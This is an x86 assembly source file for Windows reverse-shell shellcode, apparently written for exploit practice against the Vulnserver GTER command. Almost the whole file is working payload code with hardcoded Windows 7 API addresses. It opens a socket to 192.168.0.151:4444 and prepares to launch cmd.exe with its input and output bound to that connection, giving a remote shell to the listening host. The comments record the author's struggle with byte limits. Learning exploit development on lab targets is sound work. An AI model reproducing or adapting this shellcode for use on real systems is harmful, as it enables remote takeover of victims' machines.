; Windows Reverse Shellcode for Vulnserv::GTER
; Not that generic:
; * the addresses are hardcoded for Win 7 SP1 32b Build 7601
; * the IP is hardcoded to 192.168.0.151:4444
; * the last 5 bytes are commented out and called from elsewhere :(
; Compile with: nasm -f bin shellcode.asm

[bits 32]

_start:

; create ws2_32.dll string
xor eax, eax
mov ax, '32'
push eax
push 'ws2_'
push esp ; ptr to ws2_32.dll string

; call LoadLibrary = 0x0004,DE35
mov eax, 0x7737DE35
call eax

; save LoadLibrary pointer
xchg ebp, eax

; call WSAStartup(MAKRWORD(2,2), ...)
xor ebx, ebx
mov bx, 0x212
sub esp, ebx ; alloc space
push esp
push ebx
mov eax, 0x76853AB2
call eax
; when success, EAX==0

; call WSASocketA
push eax ; dwFlags = 0
push eax ; g = no group
push eax ; lpProtocolInfo = 0
push eax ; protocol = default(0)
inc eax
push eax ; type = SOCK_STREAM(1)
inc eax
push eax ; af = AF_INET(2)
mov eax, 0x7685E562
call eax

; save socket for later
xchg eax, edi

; create 192.168.0.151:4444 <- TARGET SPECIFIC
mov ebx, 0xC0A80197 ; Big Endian order
dec bh ; zero the second octed
bswap ebx
push ebx
push word 0x5c11 ; Big Endian order
xor ebx, ebx
add bl, 2
push word bx
mov edx, esp

push byte 16
push edx
push edi

; call connect
mov eax, 0x768568F5
call eax
; on success EAX==0

; create cmd string
mov edx, 0x646d6363 ; 'cmd'
shr edx, 8 
push edx
mov ebp, esp

; create PROCESS_INFORMATION: to be filled by new process
sub esp, 16
mov ebx, esp

push edi ; hStdError = socket
push edi ; hStdOutput = socket
push edi ; hStdInput = socket
push eax ; lpReserved = NULL
push eax ; wShowWindow = SW_HIDE
inc eax
mov esi, eax ; save 0x01 for later
xchg ah, al
inc eax
push eax ; dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
xor ecx, ecx
xor edx, edx
mov cl, 10
push_zero:
    push edx ; other params = NULL
loop push_zero ; until ecx==0
add cl, 44 ; cb = sizeof(STARTUPINFO)
push ecx
mov eax, esp ; STARTUP_INFO

push ebx ; lpProcessInformation
push eax ; lpStartupInfo
push edx ; lpCurrentDirectory = NULL
push edx ; lpEnvironment = NULL
push edx ; dwCreationFalgs = NULL
push esi ; bInheritHandles = TRUE
push edx ; lpThreadAttributes = NULL
push edx ; lpProcessAttributes = NULL
push ebp ; lpCommandLine = 'cmd'
push edx ; lpApplicationName = NULL

; tried hard, but won't fit here. missed 2 bytes :(. need to jump few bytes forward
jmp $+14

; below will be hardcoded in the program
;mov ebx, 0x77332082
;call ebx
